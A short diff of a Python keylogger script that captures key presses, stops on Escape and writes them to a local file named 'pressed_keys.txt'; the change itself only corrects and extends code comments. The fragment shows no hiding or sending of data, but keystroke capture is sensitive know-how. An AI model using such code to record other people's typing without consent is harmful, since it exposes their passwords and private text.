@@ -20,9 +20,9 @@ def released(key):
   if key == Key.esc:
     return False
 
-#defining function to access/create the file
+#defining function to access/create the file and to put content on it
 def write_on_file(pressed_keys):
-  with open('pressed_keys.txt', 'w') as f: # use 'w'when the file hasn't been created yet and 'a' when it has
+  with open('pressed_keys.txt', 'w') as f: # use 'w' when the file hasn't been created yet and 'a' when it has
     for key in pressed_keys:
       x = str(key).replace("'", "") # removing quotation marks
       if(x.find("space")) > 0: # when space is pressed to create a space
